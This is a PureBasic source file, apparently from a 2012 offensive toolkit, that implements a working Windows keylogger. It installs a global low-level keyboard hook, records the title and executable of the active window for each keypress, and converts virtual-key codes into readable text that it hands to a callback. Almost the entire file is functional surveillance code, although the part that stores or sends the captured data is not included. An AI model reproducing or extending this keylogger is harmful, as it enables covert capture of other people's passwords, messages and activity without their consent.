; ***************************************************************************
; *                                                                         *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; * License:     BSD License                                                *
; * Copyright:   (c) 2012, a12d404.net                                      *
; * Status:      Prototype                                                  *
; *                                                                         *
; ***************************************************************************
EnableExplicit


XIncludeFile("core/utils.pbi")
XIncludeFile("lib/kernel32.pbi")
XIncludeFile("lib/user32.pbi")
XIncludeFile("processes/processes.pbi")

; ---------------------------------------------------------------------------
;- Consts


; ---------------------------------------------------------------------------
;- Types


; ---------------------------------------------------------------------------
;- Prototypes
Prototype KeyloggerEventProc(activeApplicationTitle.s, activeApplicationExe.s, sameActiveApp.b, key.i)
Declare.b Load_keylogger(*eventProc.KeyloggerEventProc)
Declare.b Unload_keylogger()
Declare.s GetPressedKeyByVKey(key.i)
; [Internal]
Declare.i keylogger_HookProc(code.i, *wParam, *lParam)


; ---------------------------------------------------------------------------
;- Variables
Global *keylogger_hook = #Null
Global keylogger_outFile.i = 0
Global *keylogger_eventProc.KeyloggerEventProc
Global keylogger_lastActiveApp.s
Global keylogger_lastActiveAppExe.s

; ---------------------------------------------------------------------------
;- Procedures

; ***************************************************************************
; * Load_keylogger -- Loads a neccessary libraries and starts the keylogger *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.b Load_keylogger(*eventProc.KeyloggerEventProc)
  If *keylogger_hook <> #Null
    ProcedureReturn #True
  EndIf
  
  If Not *eventProc
    ProcedureReturn #False
  EndIf
  
  If Not (Load_user32() And Load_Kernel32())
    ProcedureReturn #False
  EndIf
  
  *keylogger_eventProc = *eventProc
  keylogger_lastActiveApp = ""
  keylogger_lastActiveAppExe = ""
  OutputDebugString_("@keylogger_HookProc(): " + Str(@keylogger_HookProc()))
  OutputDebugString_("GetModuleHandle(): " + Str(GetModuleHandle("")))
  *keylogger_hook = SetWindowsHookEx(#WH_KEYBOARD_LL, @keylogger_HookProc(), GetModuleHandle(""), 0)
  OutputDebugString_("*keylogger_hook: " + Str(*keylogger_hook))
  
  Unload_user32()
  Unload_Kernel32()
  If *keylogger_hook
    ProcedureReturn #True
  EndIf
  
  CloseFile(keylogger_outFile)
  keylogger_outFile = 0
  
  ProcedureReturn #False
EndProcedure

; ***************************************************************************
; * Unload_keylogger -- Stops the keylogger and closes the remaining handle *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.b Unload_keylogger()
  If keylogger_outFile <> 0
    CloseFile(keylogger_outFile)
    keylogger_outFile = 0
  EndIf
  
  *keylogger_hook = #Null
  ProcedureReturn #True
EndProcedure

; ***************************************************************************
; * GetPressedKeyByVKey -- Converts the supplied vKey to a string.          *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.s GetPressedKeyByVKey(key.i)
  Define res.s = ""
  Define outChar.w = 0
  Define mVk.i = 0
  Dim keyState.b(256)
  
  If Not GetKeyboardState(keyState())
    Goto GetPressedKeyByVKeyError
  EndIf
  
  Select key
    Case $03 ; VK_CANCEL
      res = "[[Control-break processing]]"
    Case $08 ; VK_BACK
      res = "[[BACKSPACE]]"
    Case $09 ; VK_TAB
      res = "[[TAB]]"
    Case $0C ; VK_CLEAR
      res = "[[CLEAR]]"
    Case $0D ; VK_RETURN
      res = "[[ENTER]]"
    Case $10 ; VK_SHIFT
      res = "[[SHIFT]]"
    Case $11 ; VK_CONTROL
      res = "[[CTRL]]"
    Case $12 ; VK_MENU
      res = "[[ALT]]"
    Case $13 ; VK_PAUSE
      res = "[[PAUSE]]"
    Case $14 ; VK_CAPITAL
      res = "[[CAPS LOCK]]"
    Case $1B ; VK_ESCAPE
      res = "[[ESC]]"
    Case $20 ; VK_SPACE
      res = "[[SPACEBAR]]"
    Case $21 ; VK_PRIOR
      res = "[[PAGE UP]]"
    Case $22 ; VK_NEXT
      res = "[[PAGE DOWN]]"
    Case $23 ; VK_END
      res = "[[END]]"
    Case $24 ; VK_HOME
      res = "[[HOME]]"
    Case $25 ; VK_LEFT
      res = "[[LEFT ARROW]]"
    Case $26 ; VK_UP
      res = "[[UP ARROW]]"
    Case $27 ; VK_RIGHT
      res = "[[RIGHT ARROW]]"
    Case $28 ; VK_DOWN
      res = "[[DOWN ARROW]]"
    Case $29 ; VK_SELECT
      res = "[[SELECT]]"
    Case $2A ; VK_PRINT
      res = "[[PRINT]]"
    Case $2B ; VK_EXECUTE
      res = "[[EXECUTE]]"
    Case $2C ; VK_SNAPSHOT
      res = "[[PRINT SCREEN]]"
    Case $2D ; VK_INSERT
      res = "[[INS]]"
    Case $2E ; VK_DELETE
      res = "[[DEL]]"
    Case $2F ; VK_HELP
      res = "[[HELP]]"
    Case $5B ; VK_LWIN
      res = "[[Left Windows]]"
    Case $5C ; VK_RWIN
      res = "[[Right Windows]]"
    Case $5D ; VK_APPS
      res = "[[Applications (Naturalboard)]]"
    Case $5F ; VK_SLEEP
      res = "[[Computer Sleep]]"
    Case $60 ; VK_NUMPAD0
      res = "[[Numericpad 0]]"
    Case $61 ; VK_NUMPAD1
      res = "[[Numericpad 1]]"
    Case $62 ; VK_NUMPAD2
      res = "[[Numericpad 2]]"
    Case $63 ; VK_NUMPAD3
      res = "[[Numericpad 3]]"
    Case $64 ; VK_NUMPAD4
      res = "[[Numericpad 4]]"
    Case $65 ; VK_NUMPAD5
      res = "[[Numericpad 5]]"
    Case $66 ; VK_NUMPAD6
      res = "[[Numericpad 6]]"
    Case $67 ; VK_NUMPAD7
      res = "[[Numericpad 7]]"
    Case $68 ; VK_NUMPAD8
      res = "[[Numericpad 8]]"
    Case $69 ; VK_NUMPAD9
      res = "[[Numericpad 9]]"
    Case $6A ; VK_MULTIPLY
      res = "[[Multiply]]"
    Case $6B ; VK_ADD
      res = "[[Add]]"
    Case $6C ; VK_SEPARATOR
      res = "[[Separator]]"
    Case $6D ; VK_SUBTRACT
      res = "[[Subtract]]"
    Case $6E ; VK_DECIMAL
      res = "[[Decimal]]"
    Case $6F ; VK_DIVIDE
      res = "[[Divide]]"
    Case $70 ; VK_F1
      res = "[[F1]]"
    Case $71 ; VK_F2
      res = "[[F2]]"
    Case $72 ; VK_F3
      res = "[[F3]]"
    Case $73 ; VK_F4
      res = "[[F4]]"
    Case $74 ; VK_F5
      res = "[[F5]]"
    Case $75 ; VK_F6
      res = "[[F6]]"
    Case $76 ; VK_F7
      res = "[[F7]]"
    Case $77 ; VK_F8
      res = "[[F8]]"
    Case $78 ; VK_F9
      res = "[[F9]]"
    Case $79 ; VK_F10
      res = "[[F10]]"
    Case $7A ; VK_F11
      res = "[[F11]]"
    Case $7B ; VK_F12
      res = "[[F12]]"
    Case $7C ; VK_F13
      res = "[[F13]]"
    Case $7D ; VK_F14
      res = "[[F14]]"
    Case $7E ; VK_F15
      res = "[[F15]]"
    Case $7F ; VK_F16
      res = "[[F16]]"
    Case $80 ; VK_F17
      res = "[[F17]]"
    Case $81 ; VK_F18
      res = "[[F18]]"
    Case $82 ; VK_F19
      res = "[[F19]]"
    Case $83 ; VK_F20
      res = "[[F20]]"
    Case $84 ; VK_F21
      res = "[[F21]]"
    Case $85 ; VK_F22
      res = "[[F22]]"
    Case $86 ; VK_F23
      res = "[[F23]]"
    Case $87 ; VK_F24
      res = "[[F24]]"
    Case $90 ; VK_NUMLOCK
      res = "[[NUM LOCK]]"
    Case $91 ; VK_SCROLL
      res = "[[SCROLL LOCK]]"
    Case $A0 ; VK_LSHIFT
      res = "[[Left SHIFT]]"
    Case $A1 ; VK_RSHIFT
      res = "[[Right SHIFT]]"
    Case $A2 ; VK_LCONTROL
      res = "[[Left CONTROL]]"
    Case $A3 ; VK_RCONTROL
      res = "[[Right CONTROL]]"
    Case $A4 ; VK_LMENU
      res = "[[Left MENU]]"
    Case $A5 ; VK_RMENU
      res = "[[Right MENU]]"
    Case $A6 ; VK_BROWSER_BACK
      res = "[[Browser Back]]"
    Case $A7 ; VK_BROWSER_FORWARD
      res = "[[Browser Forward]]"
    Case $A8 ; VK_BROWSER_REFRESH
      res = "[[Browser Refresh]]"
    Case $A9 ; VK_BROWSER_STOP
      res = "[[Browser Stop]]"
    Case $AA ; VK_BROWSER_SEARCH
      res = "[[Browser Search ]]"
    Case $AB ; VK_BROWSER_FAVORITES
      res = "[[Browser Favorites]]"
    Case $AC ; VK_BROWSER_HOME
      res = "[[Browser Start and Home]]"
    Case $AD ; VK_VOLUME_MUTE
      res = "[[Volume Mute]]"
    Case $AE ; VK_VOLUME_DOWN
      res = "[[Volume Down]]"
    Case $AF ; VK_VOLUME_UP
      res = "[[Volume Up]]"
    Case $B0 ; VK_MEDIA_NEXT_TRACK
      res = "[[Next Track]]"
    Case $B1 ; VK_MEDIA_PREV_TRACK
      res = "[[Previous Track]]"
    Case $B2 ; VK_MEDIA_STOP
      res = "[[Stop Media]]"
    Case $B3 ; VK_MEDIA_PLAY_PAUSE
      res = "[[Play/Pause Media]]"
    Case $B4 ; VK_LAUNCH_MAIL
      res = "[[Start Mail]]"
    Case $B5 ; VK_LAUNCH_MEDIA_SELECT
      res = "[[Select Media]]"
    Case $B6 ; VK_LAUNCH_APP1
      res = "[[Start Application 1]]"
    Case $B7 ; VK_LAUNCH_APP2
      res = "[[Start Application 2]]"
    Case $BB ; VK_OEM_PLUS
      res = "+"
    Case $BC ; VK_OEM_COMMA
      res = ","
    Case $BD ; VK_OEM_MINUS
      res = "-"
    Case $BE ; VK_OEM_PERIOD
      res = "."
    Case $E2 ; VK_OEM_102
      res = "[[angle bracket or the backslash]]"
    Case $F6 ; VK_ATTN
      res = "[[Attn]]"
    Case $F7 ; VK_CRSEL
      res = "[[CrSel]]"
    Case $F8 ; VK_EXSEL
      res = "[[ExSel]]"
    Case $F9 ; VK_EREOF
      res = "[[Erase EOF]]"
    Case $FA ; VK_PLAY
      res = "[[Play]]"
    Case $FB ; VK_ZOOM
      res = "[[Zoom]]"
    Case $FD ; VK_PA1
      res = "[[PA1]]"
    Case $FE ; VK_OEM_CLEAR
      res = "[[Clear]]"
    Default
      mVk = MapVirtualKey(key, 0)
      If ToAscii(key, mVk, keyState(), @outChar, 0) = 1
        res = Chr(outChar)
      ElseIf GetKeyNameText(MAKELONG(0, mVk), keyState(), 256) > 0
        res = "[" + PeekS(keyState()) + "]"
      EndIf
  EndSelect
    
GetPressedKeyByVKeyCleanup:
  ProcedureReturn res
GetPressedKeyByVKeyError:
  res = ""
  Goto GetPressedKeyByVKeyCleanup
EndProcedure

; ---------------------------------------------------------------------------
; [Internal] Procedures

; ***************************************************************************
; * keylogger_HookProc -- Calls the supplied callback with the pressed key. *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
Procedure.i keylogger_HookProc(code.i, *wParam, *lParam)
  Define *p.KBDLLHOOKSTRUCT = *lParam
  Define activeApp.s
  Define sameApp.b = #False
  
  If *wParam = #WM_KEYDOWN
    If Load_Kernel32()
      activeApp = GetActiveWindowText()
      If keylogger_lastActiveApp = activeApp
        sameApp = #True
       Else
         keylogger_lastActiveApp = activeApp
         keylogger_lastActiveAppExe = GetExeNameByPid(GetActiveWindowPid())
      EndIf
      *keylogger_eventProc(activeApp, keylogger_lastActiveAppExe, sameApp, *p\vkCode)
      
      Unload_Kernel32()
    EndIf
  EndIf
  
  ProcedureReturn CallNextHookEx(#Null, code, *wParam, *lParam)
EndProcedure

; ---------------------------------------------------------------------------

; ***************************************************************************
; * Sample -- Does nothing ... really!                                      *
; * Author:      marpie (marpie+toolkit@a12d404.net)                        *
; ***************************************************************************
;Procedure Sample(param.l)
  ; params:
  ;   - param -> first parameter
;EndProcedure

; IDE Options = PureBasic 4.60 RC 1 (Windows - x64)
; CursorPosition = 71
; FirstLine = 54
; Folding = x
; EnableXP
; EnablePurifier
; EnableCompileCount = 0
; EnableBuildCount = 0
; EnableExeConstant